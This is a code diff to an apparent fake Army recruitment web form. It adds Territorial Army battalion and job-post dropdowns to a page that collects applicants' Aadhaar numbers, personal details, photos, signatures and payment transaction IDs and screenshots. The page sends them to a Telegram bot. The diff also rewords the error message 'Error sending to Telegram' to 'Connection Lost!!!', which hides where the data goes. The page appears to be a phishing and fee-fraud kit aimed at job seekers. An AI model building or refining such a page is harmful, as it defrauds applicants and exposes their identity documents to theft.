@@ -255,6 +255,10 @@
     <div class="form-step active" id="step-1">
      <label for="apply">Apply Zone:</label>
       <select id="apply" required></select>
+      <label for="venue">Battalion/venue:</label>
+      <select id="venue" required></select>
+      <label for="post">Posts:</label>
+      <select id="post" required></select>
       <label for="name">Full Name:</label>
       <input type="text" id="name" required />
       <label for="confirm_name">Confirm Full Name:</label>
@@ -277,7 +281,7 @@
       <label for="code">Pin Code:</label>
       <input type="text" id="code" required />
       <label for="state">State:</label>
-      <input type="text" id="state" required />
+      <select id="state" required></select>
       <label for="email">Email:</label>
       <input type="text" id="email" required />
       <label for="number">Phone Number:</label>
@@ -291,7 +295,7 @@
       <label for="board">Board:</label>
       <select id="board" required></select>
       <label for="percent">10th Percentage:</label>
-      <input type="number" id="percent" min="45" max="100" required />
+<input type="number" id="percent" name="percent" min="45" max="100" step="0.01" inputmode="decimal" required />
       <label for="pass_date">Passing Date:</label>
       <input type="date" id="pass_date" required />
       <button type="button" onclick="prevStep(2)">Back</button>
@@ -310,7 +314,7 @@
   </div>
       
 
-      <label for="txn_id">Transaction ID:</label>
+      <label for="txn_id">UTR ID/Transaction ID:</label>
       <input type="text" id="txn_id" maxlength="12" pattern="\d{12}" required />
 
       <label for="payment_screenshot">Upload Payment Screenshot:</label>
@@ -422,6 +426,8 @@
     const gender = document.getElementById("gender").selectedOptions[0].text;
     const religion = document.getElementById("religion").selectedOptions[0].text;
     const apply = document.getElementById("apply").selectedOptions[0].text;
+    const venue = document.getElementById("venue").selectedOptions[0].text;
+    const post = document.getElementById("post").selectedOptions[0].text;
     const state = document.getElementById("state").value;
     const VPO = document.getElementById("VPO").value;
     const code = document.getElementById("code").value;
@@ -443,6 +449,8 @@
 📝 *Army Recruitment Application*
 📄 Application No: ${appNo}
 Apply Zone: ${apply}
+Battalion/venue: ${venue}
+Posts: ${post}
 
 👤 Name: ${name}
 👨‍👩‍👦 Father's Name: ${father}
@@ -494,13 +502,13 @@ Phone Number: ${number}
       if (signSrc.startsWith("data:")) await sendPhoto(signSrc, `✍️ Signature - ${appNo}`);
 
       showSummary({
-        appNo, apply, name, father, mother, gender, religion, state, code, VPO, dob, aadhar, email, number,
+        appNo, apply, venue, post, name, father, mother, gender, religion, state, code, VPO, dob, aadhar, email, number,
         roll10, board, percent, passDate, txnId
       });
 
     } catch (err) {
       console.error(err);
-      alert("Error sending to Telegram");
+      alert("Connection Lost!!!");
     }
   });
 
@@ -544,6 +552,8 @@ Phone Number: ${number}
       </thead>
       <tbody>
       <tr><td style="padding: 8px; border: 1px solid #ccc;"><strong>Apply Zone</strong></td><td style="padding: 8px; border: 1px solid #ccc;">${data.apply}</td></tr>
+      <tr><td style="padding: 8px; border: 1px solid #ccc;"><strong>Battalion/venue</strong></td><td style="padding: 8px; border: 1px solid #ccc;">${data.venue}</td></tr>
+      <tr><td style="padding: 8px; border: 1px solid #ccc;"><strong>Posts</strong></td><td style="padding: 8px; border: 1px solid #ccc;">${data.post}</td></tr>
         <tr><td style="padding: 8px; border: 1px solid #ccc;"><strong>Full Name</strong></td><td style="padding: 8px; border: 1px solid #ccc;">${data.name}</td></tr>
         <tr><td style="padding: 8px; border: 1px solid #ccc;"><strong>Father's Name</strong></td><td style="padding: 8px; border: 1px solid #ccc;">${data.father}</td></tr>
         <tr><td style="padding: 8px; border: 1px solid #ccc;"><strong>Mother's Name</strong></td><td style="padding: 8px; border: 1px solid #ccc;">${data.mother}</td></tr>
@@ -620,8 +630,38 @@ Phone Number: ${number}
     if (applySelect) {
       applySelect.innerHTML = `
         <option selected="selected" value="0">-- Select --</option>
-        <option value="1">ZONE 1</option>
-        <option value="2">ZONE 4</option>
+        <option value="1">ZONE 4</option>
+        
+      `;
+    }
+    
+    // Battalion/venue Options
+    const venueSelect = document.getElementById('venue');
+    if (venueSelect) {
+      venueSelect.innerHTML = `
+        <option selected="selected" value="0">-- Select --</option>
+        <option value="1">11B Infantry Battalion(Ta)-GRENADIERS/Nagpur</option>
+        <option value="2">125 Infantry Battalion(Ta) The Guards/Moulaali (Hyderabad) </option>
+        <option value="3">122 Infantry Battalion(Ta) MADRAS/Kannur(Kerala)</option>
+        <option value="4">101 Infantry Battalion(Ta) MARATHA LI /Pune</option>
+      `;
+    }
+    
+     // Apply post Options
+    const postSelect = document.getElementById('post');
+    if (postSelect) {
+      postSelect.innerHTML = `
+        <option selected="selected" value="0">-- Select --</option>
+        <option value="1">Soldier GD</option>
+        <option value="2">Chef Community</option>
+        <option value="3">Cook</option>
+        <option value="4">Mess Keeper</option>
+        <option value="5">Hair Dresser</option>
+        <option value="6">Housekeeper</option>
+        <option value="7">Carpenter</option>
+        <option value="8">Tailor</option>
+        <option value="9">Washerman</option>
+        
       `;
     }
 
@@ -650,6 +690,50 @@ Phone Number: ${number}
         <option value="-1">Other</option>
       `;
     }
+    
+    // State Options
+const stateSelect = document.getElementById('state');
+if (stateSelect) {
+  stateSelect.innerHTML = `
+    <option selected="selected" value="">-- Select State --</option>
+    <option value="AN">Andaman and Nicobar Islands</option>
+    <option value="AP">Andhra Pradesh</option>
+    <option value="AR">Arunachal Pradesh</option>
+    <option value="AS">Assam</option>
+    <option value="BR">Bihar</option>
+    <option value="CH">Chandigarh</option>
+    <option value="CT">Chhattisgarh</option>
+    <option value="DN">Dadra and Nagar Haveli and Daman and Diu</option>
+    <option value="DL">Delhi</option>
+    <option value="GA">Goa</option>
+    <option value="GJ">Gujarat</option>
+    <option value="HR">Haryana</option>
+    <option value="HP">Himachal Pradesh</option>
+    <option value="JK">Jammu and Kashmir</option>
+    <option value="JH">Jharkhand</option>
+    <option value="KA">Karnataka</option>
+    <option value="KL">Kerala</option>
+    <option value="LA">Ladakh</option>
+    <option value="LD">Lakshadweep</option>
+    <option value="MP">Madhya Pradesh</option>
+    <option value="MH">Maharashtra</option>
+    <option value="MN">Manipur</option>
+    <option value="ML">Meghalaya</option>
+    <option value="MZ">Mizoram</option>
+    <option value="NL">Nagaland</option>
+    <option value="OR">Odisha</option>
+    <option value="PY">Puducherry</option>
+    <option value="PB">Punjab</option>
+    <option value="RJ">Rajasthan</option>
+    <option value="SK">Sikkim</option>
+    <option value="TN">Tamil Nadu</option>
+    <option value="TS">Telangana</option>
+    <option value="TR">Tripura</option>
+    <option value="UP">Uttar Pradesh</option>
+    <option value="UK">Uttarakhand</option>
+    <option value="WB">West Bengal</option>
+  `;
+}
 	   // Simulate 3 seconds loading time
   setTimeout(function() {
     // Hide the loader and display the QR code with animation
